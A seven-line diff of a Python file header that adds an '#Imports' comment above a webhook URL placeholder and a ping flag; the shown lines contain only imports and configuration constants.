@@ -1,7 +1,7 @@
 import json
 import os
 from urllib.request import Request, urlopen
-
+#Imports
 WEBHOOK_URL = "%webhook%"
 
 PING_ME = True
